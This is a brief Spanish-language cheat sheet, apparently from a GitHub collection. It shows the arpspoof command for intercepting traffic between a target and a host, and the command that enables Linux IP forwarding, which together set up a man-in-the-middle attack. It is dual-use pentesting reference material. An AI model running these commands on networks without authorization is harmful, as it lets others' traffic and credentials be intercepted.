# ARPspoof Cheat Sheet

#### Interceptar tráfico entre 192.168.4.11 (Target) y 192.168.4.16 (Host)
```
arpspoof -i <Interface> -t <Target> -r <Host>
```

#### Habilitar el Linux Kernel IP Forwarding
```
echo 1 > /proc/sys/net/ipv4/ip_forward
```

---

[:arrow_left: Regresar](https://github.com/m4lal0/cheatsheets)